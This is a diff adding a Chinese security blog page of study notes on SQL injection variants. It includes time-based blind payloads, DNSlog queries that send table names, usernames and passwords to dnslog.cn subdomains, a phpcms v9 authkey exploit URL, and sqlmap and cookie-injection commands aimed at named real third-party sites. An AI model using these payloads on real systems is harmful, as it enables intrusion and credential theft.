@@ -1,0 +1,280 @@
+<!DOCTYPE html><html lang="zh-CN "><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hongxiaodou || 其他注入类型</title>
+    <meta name="author" content="hongxiaodou">
+    <meta name="description" content="林深不见鹿，山巅自相逢 ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/images/1.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<!-- hexo injector head_end start --><style>
+.body hanla:after {
+    content: ' ';
+    display: inline;
+    font-family: Arial;
+    font-size: 0.89em;
+}
+
+html code hanla,
+html pre hanla,
+html kbd hanla,
+html samp hanla {
+    display: none;
+}
+
+html ol > hanla,
+html ul > hanla {
+    display: none;
+}
+</style><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+
+    <div id="loading" style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent" style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p><hanla></hanla>加载过慢请开启缓存<hanla></hanla>(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hongxiaodou</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>主页</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>Hongxiaodou</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled">
+                    </a-icon></div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;"><hanla></hanla>主页</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>其他注入类型 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled">
+            </a-icon></span>
+            2021/9/27
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/sql注入">
+                <span class="icon">
+                    <a-icon type="book" theme="filled">
+                </a-icon></span><hanla></hanla>
+                sql<hanla></hanla>注入
+            </a>
+        </span>
+        
+
+        
+    </div>
+
+    <div class="content" v-pre="">
+        <p>其他注入类型</p>
+<span id="more"></span>
+
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IkvQLz"><img src="https://s3.jpg.cm/2021/09/27/IkvQLz.png" alt="IkvQLz.png"></a></p>
+<h2 id="1-常见的提交方式"><a href="#1-常见的提交方式" class="headerlink" title="1.常见的提交方式"></a><hanla></hanla>1.<hanla></hanla>常见的提交方式</h2><h4 id="get"><a href="#get" class="headerlink" title="get"></a><hanla></hanla>get</h4><p>/<br>-0<br>%bf’<br>and 1=1<br>and 1=2<br><hanla></hanla>搜索框属于字符类型  </p>
+<h4 id="post"><a href="#post" class="headerlink" title="post"></a>post</h4><p><hanla></hanla>post<hanla></hanla>提交方式主要适用于表单的提交<br>可能存在漏洞的位置：<br>搜索框、登录、留言、<br>注册<br>挖掘的时候注入魔术引号<br>例如：<br><a target="_blank" rel="noopener" href="http://www.cracer.com/admin.php">www.cracer.com/admin.php</a><br><hanla></hanla>测试站点：<br><a target="_blank" rel="noopener" href="http://testasp.vulnweb.com/login.asp?tfUPass=&amp;tfUName=">http://testasp.vulnweb.com/login.asp?tfUPass=&amp;tfUName=</a><br><hanla></hanla>测试工具<br><hanla></hanla>pangolin  sqlmap<br><hanla></hanla>Xdcms +burp<hanla></hanla>注入  </p>
+<p><hanla></hanla>xdcms<hanla></hanla>全版本存在<hanla></hanla>sql<hanla></hanla>注入漏洞<br>需要使用代理抓包改包工具进行完成  </p>
+<p>cookie<br><hanla></hanla>用来注入绕过通用防护<br>挖掘逻辑漏洞<br><hanla></hanla>cookie<hanla></hanla>提交用于账号密码的<hanla></hanla>cookie<hanla></hanla>缓存<br><hanla></hanla>还可以通过<hanla></hanla>cookie<hanla></hanla>注入来突破简单的防注入系统  </p>
+<p>测试站点：<br><a target="_blank" rel="noopener" href="http://www.jnrcjt.com/onepage3.asp?id=30">http://www.jnrcjt.com/onepage3.asp?id=30</a><br>sqlmap.py -u “<a target="_blank" rel="noopener" href="http://www.jnrcjt.com/onepage3.asp&quot;">http://www.jnrcjt.com/onepage3.asp"</a> –cookie “id=30”   –level 2  </p>
+<p>清空地址栏，输入：<br>javascript:alert(document.cookie=”id=”+escape(“30and 1=2”))，<br><hanla></hanla>然后去掉？id=1556<hanla></hanla>输入<br><a target="_blank" rel="noopener" href="http://soft.xxxxx.edu.cn/list.asp%EF%BC%8C"><hanla></hanla>http://soft.XXXXX.edu.cn/list.asp，</a><br>返回正常  </p>
+<p>javascript:alert(document.cookie=”id=”+escape(“1556 and 1=2 select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,,27,28,29,30 from admin”))  </p>
+<p>用中转注入工具注入<br>链接里面的测试站点都挂掉了</p>
+<h4 id="head"><a href="#head" class="headerlink" title="head"></a>head</h4><p>put<br>tomcat 7.0.0=7.0.89<br><hanla></hanla>存在<hanla></hanla>put<hanla></hanla>上传漏洞<br><hanla></hanla>jsp，中间件逻辑<hanla></hanla>xss<hanla></hanla>比较多，注入上传很少<br><hanla></hanla>option</p>
+<p>windows gbk 编码存在宽字节注入<br><hanla></hanla>linux 是<hanla></hanla>utf-8</p>
+<h2 id="http请求头注入"><a href="#http请求头注入" class="headerlink" title="http请求头注入"></a><hanla></hanla>http<hanla></hanla>请求头注入</h2><p><hanla></hanla>host<br>user-agent<br><hanla></hanla>x-forwarded-for: 1.1.1.1   /<hanla></hanla>有可能<br><hanla></hanla>client-ip: 1.1.1.1        /<hanla></hanla>有可能<br><hanla></hanla>referrer:<br>js<br><hanla></hanla>会记录你<hanla></hanla>ip<hanla></hanla>的网站，可能存在注入<br>投资理财，资金盘，留言，贴吧  </p>
+<p>用插件<br><hanla></hanla>modify header  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Ikv52R"><img src="https://s3.jpg.cm/2021/09/27/Ikv52R.png" alt="Ikv52R.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Ikvdbu"><img src="https://s3.jpg.cm/2021/09/27/Ikvdbu.png" alt="Ikvdbu.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IkvnNt"><img src="https://s3.jpg.cm/2021/09/27/IkvnNt.png" alt="IkvnNt.png"></a></p>
+<h2 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h2><p><a target="_blank" rel="noopener" href="http://www.cracer.com/xxx/_html/_id+123"><hanla></hanla>www.cracer.com/xxx\_html\_id+123</a><br>Cracer.com/sfcxdf/sfsdfs/?445.html<br>Aspcms<br>phpweb  </p>
+<h2 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h2><p>延时注入是通过页面返回的时间来判断的<br><hanla></hanla>不同的<hanla></hanla>mysql<hanla></hanla>数据库版本，延迟注入语句也不同<br><hanla></hanla>mysql &gt;=5.0  的可以使用<hanla></hanla>sleep()<hanla></hanla>进行查询<br><hanla></hanla>mysql&lt;5.0  的可以使用<hanla></hanla>benchmark()<hanla></hanla>进行查询<br><hanla></hanla>benchmark<hanla></hanla>用法<br><hanla></hanla>benchmark(n,sql<hanla></hanla>语句)  n<hanla></hanla>为查询次数<br>通过查询次数增多 时间变得缓慢来判断是否存在延迟<br><hanla></hanla>select benchmark(1000,select * from admin) ;</p>
+<p><hanla></hanla>sleep()<hanla></hanla>延迟注入用法<br><hanla></hanla>sleep 可以强制产生一个固定的延迟。<br><hanla></hanla>sleep()<hanla></hanla>延迟注入核心原理<br><hanla></hanla>and if(true,sleep(5),0); ==IF(1=1, true, false);<br>id=1 and sleep(5)  判断下是否存在延迟注入<br><hanla></hanla>and if(substring(user(),1,4)=’root’,sleep(5),1)<br><hanla></hanla>判断当前用户<br><hanla></hanla>and if(MID(version(),1,1) LIKE 5, sleep(5), 1)<br><hanla></hanla>判断数据库版本信息是否为<hanla></hanla>5<br><hanla></hanla>可以去猜解他的数据库名称<br><hanla></hanla>and if(ascii(substring(database(),1,4))&gt;100,sleep(5),1)<br>and If(ascii(substr(database(),1,1))&lt;115,sleep(10),1)–+<br>and If(length((version()))=6,sleep(10),1)–+<br>sqlmap –time-sec=2  延迟注入 </p>
+<p>手工时间盲注</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/DarkHQ/article/details/79274376">https://blog.csdn.net/DarkHQ/article/details/79274376</a></p>
+<h2 id="dnslog注入"><a href="#dnslog注入" class="headerlink" title="dnslog注入"></a><hanla></hanla>dnslog<hanla></hanla>注入</h2><p><hanla></hanla>dnslog 平台会记录域名<hanla></hanla>dns<hanla></hanla>查询记录，通过我们把查询的结果和<br><hanla></hanla>dns<hanla></hanla>子域名拼接，发送给<hanla></hanla>dnslog<hanla></hanla>平台查询，就会记录我们的语句<br>查询结果，从而快速提升延迟注入速度。<br>条件：<br><hanla></hanla>root<hanla></hanla>权限（要借助<hanla></hanla>load_file()<hanla></hanla>函数）  </p>
+<p>dns 注入列表名<br><hanla></hanla>dns<hanla></hanla>注入需要<hanla></hanla>root<hanla></hanla>权限  </p>
+<pre><code><hanla></hanla>and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema='jian' limit 0,1),'.tunxf1.dnslog.cn\\abc'))),1,1)--+    #查表名
+
+and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema='xycms' limit 0,1),'.7dluss.dnslog.cn\\abc'))),1,1)--+
+
+and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema='xycms' limit 1,1),'.7dluss.dnslog.cn\\abc'))),1,1)--+
+
+列列名
+and if((select load_file(concat('\\\\',(select column_name from information_schema.columns where table_name='user' limit 0,1),'.7dluss.dnslog.cn\\abc'))),1,1)--+
+and if((select load_file(concat('\\\\',(select column_name from information_schema.columns where table_name='user' and TABLE_SCHEMA='dbname' limit 0,1),'.7dluss.dnslog.cn\\abc'))),1,1)--+
+
+第二个列名
+and if((select load_file(concat('\\\\',(select column_name from information_schema.columns where table_name='user' limit 1,1),'.7dluss.dnslog.cn\\abc'))),1,1)--+
+
+dns<hanla></hanla>注入列数据
+列数据
+and if((select load_file(concat('\\\\',(select username from user limit 0,1),'.7dluss.dnslog.cn\\abc'))),1,1)--+
+
+and if((select load_file(concat('\\\\',(select password from user limit 0,1),'.7dluss.dnslog.cn\\abc'))),1,1)--+
+</code></pre>
+<h2 id="base64编码注入"><a href="#base64编码注入" class="headerlink" title="base64编码注入"></a><hanla></hanla>base64<hanla></hanla>编码注入</h2><p>解码<br>构造语句<br>编码<br><hanla></hanla>$id=base64_decode($id);  </p>
+<p>sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.0.200:8020/test.php?id=1&quot;">http://192.168.0.200:8020/test.php?id=1"</a>   –tamper=base64encode.py<br><hanla></hanla>这里?id 要写解码后的内容  </p>
+<h2 id="二阶注入"><a href="#二阶注入" class="headerlink" title="二阶注入"></a>二阶注入</h2><p>基本靠白盒审计<br><hanla></hanla>SQL<hanla></hanla>注入一般可分为两种，<br><hanla></hanla>一阶注入（普通的<hanla></hanla>SQL<hanla></hanla>注入）和二阶<hanla></hanla>SQL<hanla></hanla>注入。<br><hanla></hanla>一阶<hanla></hanla>SQL<hanla></hanla>注入发生在一个<hanla></hanla>HTTP<hanla></hanla>请求和响应中，<br>系统对攻击输入立即反应执行。</p>
+<p>一阶注入的攻击过程归纳如下：</p>
+<p><hanla></hanla>1 攻击者在<hanla></hanla>HTTP<hanla></hanla>请求中提交恶意<hanla></hanla>sql<hanla></hanla>语句。</p>
+<p><hanla></hanla>2 应用处理恶意输入，使用恶意输入动态构建<hanla></hanla>SQL<hanla></hanla>语句。</p>
+<p>3 如果攻击实现，在响应中向攻击者返回结构。</p>
+<p><hanla></hanla>二阶注入，作为<hanla></hanla>sql<hanla></hanla>注入的一种，他不同于普通的<hanla></hanla>SQL<hanla></hanla>注入，恶意代码被注入到<hanla></hanla>web<hanla></hanla>应用中不立即执行，而是存储到后端数据库，在处理另一次不同请求时，应用检索到数据库中的恶意输入并利用它动态构建<hanla></hanla>SQL<hanla></hanla>语句，实现了攻击。<br><hanla></hanla>二阶<hanla></hanla>SQL<hanla></hanla>注入的攻击过程归纳如下：<br><hanla></hanla>1 攻击者在一个<hanla></hanla>HTTP<hanla></hanla>请求中提交恶意输入<br><hanla></hanla>2 用于将恶意输入保存在数据库中。<br><hanla></hanla>3 攻击者提交第二个<hanla></hanla>HTTP<hanla></hanla>请求。<br><hanla></hanla>4 为处理第二个<hanla></hanla>HTTP<hanla></hanla>请求，应用检索存储在后端数据库中的恶意输入，动态构建<hanla></hanla>SQL<hanla></hanla>语句。<br>5 如果攻击实现，在第二个请求的响应中向攻击者返回结果。</p>
+<p>一般攻击利用是两种方式：<br>攻击存储<br>注入攻击</p>
+<h2 id="phpv9-authkey注入"><a href="#phpv9-authkey注入" class="headerlink" title="phpv9 authkey注入"></a><hanla></hanla>phpv9 authkey<hanla></hanla>注入</h2><p><hanla></hanla>利用<hanla></hanla>exp<hanla></hanla>爆出<hanla></hanla>authkey<br>phpsso_server/index.php?m=phpsso&amp;c=index&amp;a=getapplist&amp;auth_data=v=1&amp;appid=1&amp;data=662dCAZSAwgFUlUJBAxbVQJXVghTWVQHVFMEV1MRX11cBFMKBFMGHkUROlhBTVFuW1FJBAUVBwIXRlgeERUHQVlIUVJAA0lRXABSQEwNXAhZVl5V<br><hanla></hanla>然后本地构造注入页面进行注入</p>
+<p>大佬们写的太深奥了不适合我这种小白 这篇文章：<br><a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-19033-1-1.html">https://bbs.ichunqiu.com/thread-19033-1-1.html</a></p>
+<h2 id="xml实体注入"><a href="#xml实体注入" class="headerlink" title="xml实体注入"></a><hanla></hanla>xml<hanla></hanla>实体注入</h2><p><hanla></hanla>xml<br><hanla></hanla>可扩展标记语言，标准通用标记语言的子集，是一种用于标记电子文件使其具有结构性的标记语言。<br><hanla></hanla>在电子计算机中，标记指计算机所能理解的信息符号，通过此种标记，计算机之间可以处理包含各种的信息比如文章等。它可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。 它非常适合万维网传输，提供统一的方法来描述和交换独立于应用程序或供应商的结构化数据。是<hanla></hanla>Internet<hanla></hanla>环境中跨平台的、依赖于内容的技术，也是当今处理分布式结构信息的有效工具。早在<hanla></hanla>1998<hanla></hanla>年，W3C<hanla></hanla>就发布了<hanla></hanla>XML1.0<hanla></hanla>规范，使用它来简化<hanla></hanla>Internet<hanla></hanla>的文档信息传输。</p>
+<p>漏洞形成原因：<br>代码过滤不严<br>用户可以控制</p>
+<p>漏洞实例：<br>任意文件读取实例<br>用户注册注入实例</p>
+<h2 id="app注入挖掘"><a href="#app注入挖掘" class="headerlink" title="app注入挖掘"></a><hanla></hanla>app<hanla></hanla>注入挖掘</h2><p><hanla></hanla>利用抓包工具获取<hanla></hanla>app<hanla></hanla>发送到服务器的链接<br><hanla></hanla>burp fiddler<br><hanla></hanla>即可<br>得到链接进行测试<br><hanla></hanla>app<hanla></hanla>漏洞<br>文件泄露<br><hanla></hanla>sql<hanla></hanla>注入<br><hanla></hanla>xss<br><hanla></hanla>上传<br>逻辑漏洞<br>逻辑支付<br>密码找回  </p>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2021 Hongxiaodou
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled"></a-icon></span>
+            @hongxiaodou
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> &amp; <a target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'zh-CN',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+
+
+</body></html>
